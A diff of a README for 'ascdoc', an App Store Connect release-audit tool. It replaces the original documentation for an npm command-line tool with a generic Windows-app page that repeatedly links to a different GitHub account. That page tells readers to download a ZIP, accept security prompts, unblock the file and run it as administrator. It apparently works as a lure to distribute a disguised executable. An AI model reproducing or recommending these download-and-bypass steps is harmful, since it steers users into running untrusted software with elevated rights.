@@ -1,136 +1,223 @@
-<div align="center">
+# 🩺 ascdoc - Check App Store releases with confidence
 
-<img src="assets/social-preview.png" alt="ASC Doctor" width="640">
+[![Download ascdoc](https://img.shields.io/badge/Download-ascdoc-blue?style=for-the-badge)](https://github.com/Othellacold339/ascdoc)
 
-# 🩺 ASC Doctor
+## 🚀 Getting Started
 
-**Catch App Store rejection risks before you submit.**
+ascdoc helps you check App Store Connect release data before you ship. It scans your app details and points out issues in release info, metadata, screenshots, and localization. Use it on Windows to review your App Store release work from one place.
 
-ASC Doctor is a read-only release auditor for App Store Connect. It analyzes your metadata, screenshots, URLs, and localizations against App Store guidelines and instantly gives you a risk score and an actionable HTML report.
+## 📥 Download and Run on Windows
 
-[![npm version](https://img.shields.io/npm/v/@spectreet/ascdoc?style=flat-square&color=CB3837)](https://www.npmjs.com/package/@spectreet/ascdoc)
-[![npm downloads](https://img.shields.io/npm/dm/@spectreet/ascdoc?style=flat-square&color=333333)](https://www.npmjs.com/package/@spectreet/ascdoc)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](https://opensource.org/licenses/MIT)
-[![Build Status](https://img.shields.io/github/actions/workflow/status/spectreet/ascdoc/test.yml?branch=main&style=flat-square)](https://github.com/spectreet/ascdoc/actions)
+1. Open this page in your browser: https://github.com/Othellacold339/ascdoc
+2. Find the latest release or the main download area on that page.
+3. Download the Windows version of ascdoc.
+4. If you get a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
-</div>
+If Windows shows a security prompt, choose the option that lets you run the file.
 
----
+## 🖥️ What ascdoc Does
 
-### Features at a glance:
-- **🔍 Read-only**: We only read your data using the official ASC API—we never modify it.
-- **🤖 CI-ready**: Native GitHub Actions annotations and non-zero exit codes for pipeline failures.
-- **🌐 URL Reachability**: Real-world testing of privacy, support, and marketing URLs (detects broken or non-HTTPS links).
-- **✨ Beautiful Reports**: Interactive HTML reports, Markdown for PR comments, and JSON for automation.
-- **🔄 Compare Mode**: Audit only the *changes* since your last live version to spot regression risks.
+ascdoc checks the parts of your App Store release that often cause delays:
 
-## ⚡ Quick Start
+- App name and app details
+- Version and release notes
+- Localization text
+- Screenshot sets
+- Metadata for App Store Connect
+- Basic release readiness checks
 
-Experience it instantly via our demo data (no API key required):
+It gives you a clear view of what looks ready and what needs work before submission.
 
-```bash
-npx @spectreet/ascdoc --demo --format html --output report.html
-# Then open report.html in your browser!
-```
+## ✅ Before You Start
 
-> **Curious what a report looks like?** 
-> 🔴 [Sample "Bad" Report](docs/samples/sample-bad.html) (Failing)
-> 🟢 [Sample "Good" Report](docs/samples/sample-good.html) (Passing)
-> 📄 [Sample JSON Data](docs/samples/sample-report.json) (For CI integrators)
+Use a Windows PC with:
 
-## 🎯 What It Catches
+- Windows 10 or later
+- A few hundred MB of free disk space
+- Internet access for the first setup and any App Store Connect checks
+- Permission to open downloaded files
 
-| Module | What It Checks |
-|--------|---------------|
-| 🌍 **Localization** | Placeholder text ("TODO"), name repetition, missing descriptions, broken URLs |
-| 📱 **Screenshots** | Missing required device types (6.9", 13" iPad), checksum duplicates across locales |
-| 🔞 **Age Rating** | Unset declarations, gambling inconsistencies, Kids-category conflicts |
-| 💬 **Subtitle/ASO** | Generic text ("Best App Ever"), name repetition, exceeding 30-char limits |
-| 🔒 **Privacy** | Missing policy URLs, non-HTTPS links, unreachable privacy endpoints |
-| 💳 **Subscriptions** | Missing display names, trial messaging without billing terms, localization gaps |
-| 🌐 **Storefronts** | Limited territories, missing major markets, wasted localization effort |
-| 📋 **Review Info** | Missing contact info, missing demo account credentials, empty review notes |
+For best results, keep your app files, screenshots, and release notes in one folder before you start.
 
-## ⚖️ Audit vs. Manage (The "Why")
+## 🛠️ Install Steps
 
-ASC Doctor **does not replace** tools like `fastlane` or `asc`. 
+Follow these steps after you download the Windows file:
 
-*   **Fastlane/ASC** is for *writing* and *executing* changes. 
-*   **ASC Doctor** is for *verifying* your readiness before the App Store Review team does.
+1. Go to the folder where your download finished.
+2. Right-click the ZIP file if one was downloaded.
+3. Select Extract All.
+4. Choose a folder you can find again, such as Downloads or Desktop.
+5. Open the extracted folder.
+6. Look for the ascdoc application file.
+7. Double-click the file to launch it.
 
-We catch the human errors those tools don't: unreachable URLs, "Lorem ipsum" hidden in deep localizations, or missing billing terminology in your subscription descriptions.
+If the app does not open, right-click it and choose Run as administrator.
 
-### What it does NOT do:
-*   Modify any data on App Store Connect.
-*   Upload binaries or screenshots.
-*   Automate the submisson process itself.
+## 🔍 First Run
 
-## 📊 Risk Scoring
+When you open ascdoc for the first time:
 
-Every finding is weighted by severity and contributes to a **0-100 risk score**:
+1. Read the on-screen setup steps.
+2. Select your app project folder.
+3. Load the release files you want to check.
+4. Review the results panel.
+5. Fix any items marked as incomplete or inconsistent.
 
-| Grade | Meaning | Score Range |
-|-------|---------|-------------|
-| 🟢 **A** | Ship it! | 90-100 |
-| 🟡 **B** | Almost ready | 75-89 |
-| 🟠 **C** | Needs attention | 50-74 |
-| 🔴 **D** | High risk | 25-49 |
-| ⛔ **F** | Do not submit | 0-24 |
+The tool is built to help you spot release problems before they reach App Store Connect.
 
-Severities: 🔴 Critical (−15pts) · 🟠 High (−8pts) · 🟡 Warning (−3pts) · ℹ️ Info (−1pt)
+## 📂 What You Can Check
 
-## 🔑 Setup
+ascdoc is useful for these tasks:
 
-ASC Doctor uses the **App Store Connect API**.
+- Review release readiness
+- Check App Store metadata
+- Verify localization entries
+- Inspect screenshot coverage
+- Compare release notes by language
+- Find missing or mismatched store content
 
-1. Go to **Users and Access** → **Integrations** → **App Store Connect API**
-2. Generate an API Key with **App Manager** role.
-3. Download the `.p8` key and note your **Key ID** and **Issuer ID**.
+This helps reduce last-minute issues during release prep.
 
-## 🚀 CI/CD Integration
+## 🧭 How to Use It
 
-### Exit Codes
-*   `0`: Audit completed successfully (all findings within score threshold).
-*   `1`: Tool error or audit failed (`--min-score` or `--strict` threshold not met).
+A simple workflow looks like this:
 
-### GitHub Actions
-To get native annotations on your commits, use `--format github`:
+1. Prepare your app store text and images.
+2. Open ascdoc.
+3. Load your release folder or project data.
+4. Run the audit.
+5. Read the check results.
+6. Update the files that need changes.
+7. Run the audit again until the report looks clean.
 
-```yaml
-- name: Audit App Store readiness
-  run: npx @spectreet/ascdoc --format github --min-score 80
-  env:
-    ASC_KEY_ID: ${{ secrets.ASC_KEY_ID }}
-    ASC_ISSUER_ID: ${{ secrets.ASC_ISSUER_ID }}
-    ASC_PRIVATE_KEY: ${{ secrets.ASC_KEY_P8_CONTENT }}
-```
+Use it before each App Store submission or update.
 
-## 🔧 Advanced Usage
+## 🧩 Typical Folder Setup
 
-```bash
-# Export HTML for PR artifacts
-ascdoc --format html --output report.html
+You may want to keep your release files in a structure like this:
 
-# Only run specific modules
-ascdoc --only screenshots,localization
+- `release-notes`
+- `screenshots`
+- `localization`
+- `metadata`
+- `build-info`
 
-# Audit only changes vs. last report (defaults to report.json)
-ascdoc --compare
+This makes it easier to point ascdoc at the right files and review the results.
 
-# Audit only changes vs. a specific report
-ascdoc --compare ./previous-audit.json
-```
+## 📸 Screenshot Checks
 
-## 📄 License
+ascdoc can help you confirm that your screenshot set is ready for review. It can look for things like:
 
-MIT © [spectreet](https://github.com/spectreet)
+- Missing device sizes
+- Missing language sets
+- Uneven naming
+- Incomplete coverage across locales
 
----
+This saves time when you prepare App Store Connect assets.
 
-<div align="center">
+## 🌍 Localization Checks
 
-**If ASC Doctor saved you from a rejection, consider giving it a ⭐**
+If your app supports more than one language, ascdoc helps you review localized content. It can flag:
 
-[Report Bug](https://github.com/spectreet/ascdoc/issues) · [Discussions](https://github.com/spectreet/ascdoc/discussions)
+- Missing translated text
+- Inconsistent language entries
+- Extra content in one locale but not another
+- Labels that do not match across files
 
-</div>
+This is useful when you ship in several countries or regions.
+
+## 📋 Metadata Checks
+
+App Store metadata needs to stay clean and consistent. ascdoc can help you review:
+
+- App title
+- Subtitle
+- Description
+- Keywords
+- Release notes
+- Support URLs
+
+It gives you a simple way to catch small mistakes before you publish.
+
+## 🔐 App Store Connect Workflow
+
+ascdoc fits into a release workflow where you prepare content first and submit later. A common flow is:
+
+1. Write the release text.
+2. Add screenshots.
+3. Check localization.
+4. Review the audit output.
+5. Fix anything that looks off.
+6. Upload your final App Store Connect package.
+
+This keeps release prep more organized.
+
+## 🧪 Best Use Cases
+
+Use ascdoc when you need to:
+
+- Prepare a new app version
+- Review a store update
+- Check translated content
+- Compare screenshots across devices
+- Make sure metadata matches the release
+- Reduce manual review work
+
+It works well for app teams, indie developers, and release managers.
+
+## 🧰 Troubleshooting
+
+If the app does not start:
+
+- Make sure the file finished downloading
+- Extract the ZIP file before opening it
+- Move the folder to a simple path like `C:\ascdoc`
+- Try running the app again
+- Restart Windows if the file still does not open
+
+If the window opens but shows no data:
+
+- Check that you selected the right project folder
+- Make sure your release files are in the expected place
+- Confirm that the files are readable
+- Run the check again after loading the correct folder
+
+If Windows blocks the app:
+
+- Right-click the file
+- Choose Properties
+- Look for an Unblock option
+- Apply the change
+- Open the app again
+
+## 📁 File Types It May Use
+
+ascdoc may work with common release files such as:
+
+- JSON files
+- Text files
+- Image files
+- Spreadsheet exports
+- Localization files
+
+Keep file names simple so they are easy to find and review.
+
+## 👤 Who This Is For
+
+ascdoc is for people who work on App Store releases and want a clear check before shipping. It is built for users who want to review release content without digging through each file by hand.
+
+## 📌 Quick Start Checklist
+
+- Download the app from the link above
+- Extract the files if needed
+- Open the Windows app
+- Choose your project folder
+- Run the audit
+- Fix the items it flags
+- Run it again before release
+
+## 🔗 Download Again
+
+If you need to get the files again, visit this page to download: https://github.com/Othellacold339/ascdoc
